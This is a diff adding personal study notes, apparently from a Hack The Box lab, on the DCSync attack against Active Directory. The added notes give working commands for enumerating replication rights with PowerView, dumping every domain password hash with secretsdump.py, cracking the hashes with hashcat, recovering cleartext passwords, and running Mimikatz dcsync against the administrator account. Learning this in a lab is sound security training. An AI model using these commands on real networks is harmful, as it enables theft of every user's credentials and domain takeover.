@@ -204,6 +204,10 @@ If we click on the `16` next to `Transitive Object Control`, we will see the ent
 
 ![[Pasted image 20250817203744.png]]
 Finally, we can use the pre-built queries in BloodHound to confirm that the `adunn` user has DCSync rights.
+
+==click on User-3 (adunn) >> Node Info >> Outbound Object Control >> first Dgree Object Controle==
+![[Pasted image 20250819154903.png]]
+
 #### Viewing Pre-Build queries through BloodHound
 
 ![BloodHound graph showing ADUNN@INLANEFREIGHT.LOCAL's connections to various groups and users, including DOMAIN ADMINS and ENTERPRISE DOMAIN CONTROLLERS, with relationships like MemberOf and GetChangesAll.](https://academy.hackthebox.com/storage/modules/143/adunn_dcsync.png)
@@ -393,3 +397,95 @@ INLANEFREIGHT\mrb3n: AccessAllowed (CreateDirectories, GenericExecute, GenericWr
 ```
 
 There are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.
+
+# DCSync
+## What is DCSync and How Does it Work?
+DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+![[Pasted image 20250818194713.png]]
+An attacker can abuse the **DS-Replication-Get-Changes-All** right to replicate password data. Accounts with **Replicating Directory Changes** and **Replicating Directory Changes All** permissions (like Domain Admins by default) can do this. Using **ADSI Edit**, you can check if a user (e.g., _USER-3_) has these replication privileges. If a non-admin user is granted them, their account can be abused to extract NTLM hashes for any domain user:
+####  enum for DCSync
+**enum from bloodhound: **
+==click on User-3 >> Node Info >> Outbound Object Control >> first Dgree Object Controle==
+![[Pasted image 20250819154903.png]]
+
+**View adunn's Group Membership**
+```powershell
+Get-DomainUser -Identity <USER-3>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+#=> Member of (VPN Users, Printer Access, File Share H Drive...) groups
+```
+> by using powerview we confirm the user is **Standard User** + **member of critical groups  (VPN Users, Printer Access, File Share H Drive...)** so **likely he will have a high priv** 
+
+**Using Get-ObjectAcl to Check adunn's Replication Rights**
+```powershell
+$sid = Convert-NameToSid <USER-3>
+
+Get-ObjectAcl "DC=<DOMAIN>,DC=<local>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+#=> DS-Replication-Get-Changes
+#=> DS-Replication-Get-Changes-All
+```
+[+] ==**DS-Replication-Get-Changes** Acl confirms that the user does indeed have the rights.==
+>[+] **DS-Replication-Get-Changes** : ==Abusing Directly== . If a user already has replication rights (DS-Replication-Get-Changes + All), just compromise them and run DCSync.  
+>[+] **WriteDacl** : ==Abusing Indirectly==  .If a user has WriteDacl, log in as them and grant DCSync rights to your own account, then use that account to perform DCSync.  
+
+#### abuse DCSync 
+DCSync replication can be performed **using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.**
+
+##### with secretsdump.py
+>This could also likely be done all from Windows using a version of `secretsdump.exe` compiled for Windows as there are several GitHub repos of the Impacket toolkit compiled for Windows
+
+```bash
+secretsdump.py -outputfile hashes_list -just-dc <DOMAIN>/<USER-3>:<PASS>@<DC-IP>
+
+-just-dc             # Dump only NTDS.DIT data (domain creds: NTLM hashes + Kerberos keys)
+-just-dc-ntlm        # Dump only NTLM password hashes (skip Kerberos keys)
+-just-dc-user USER   # Dump data only for the specified user
+-history             # Dump previous password hashes (password history)
+-pwd-last-set        # Show when each account's password was last changed
+-user-status         # Show account status (enabled/disabled/locked)
+-outputfile FILE     # Save dumped hashes to file with the given prefix
+
+# Listing Hashes, Kerberos Keys, and Cleartext Passwords
+ls hashes_list*
+#=> hashes.ntds (NTLM hash) hashes.ntds.cleartext (txt)  hashes.ntds.kerberos (keys)
+
+# crack the hashes.ntds (NTLM hash)
+hashcat -m 1000 -a 0 "4bb3b317845f0954200a6b0acc9b9f9a" /usr/share/wordlists/rockyou.txt 
+```
+
+==[+] find NTLM hash and we crack them==
+[+] ==find USER-4 CLEARTEXT Password  in  hashes.ntds.cleartext list== 
+**hashes.ntds.cleartext** : If **reversible encryption** is enabled, AD stores passwords with RC4 and they can be decrypted using the Syskey. Tools like **secretsdump.py** will automatically recover these cleartext passwords during an NTDS dump or DCSync.
+
+Viewing an Account with Reversible Encryption Password Storage Set:
+![[Pasted image 20250818204943.png]]
+
+**Enumerating User with reversible encryption is enabled**
+```powershell
+# using cmd
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+  #=> USER-4 : userAccountControl : 640 
+
+
+# Checking for Reversible Encryption Option using Get-DomainUser
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+  # USER-4     ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT
+```
+
+ **Displaying the Decrypted Password:**
+ ```bash
+ cat inlanefreight_hashes.ntds.cleartext 
+ # <USER-4>:CLEARTEXT:<Pass123@#>
+```
+
+##### with Mimikatz (out of scope)
+Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence,
+Mimikatz must be ran in the context of the user who has DCSync privileges.(we must login to the user-3 who have the DCSync)
+```PowerShell
+runas /netonly /user:<DOMAIN>\<USER-3> powershell
+.\mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:<DOMAIN.LOCAL> /user:<DOMAIN>\administrator
+  #=> Hash NTLM: 88ad09182de639ccc6579eb0849751cf
+```
+
+
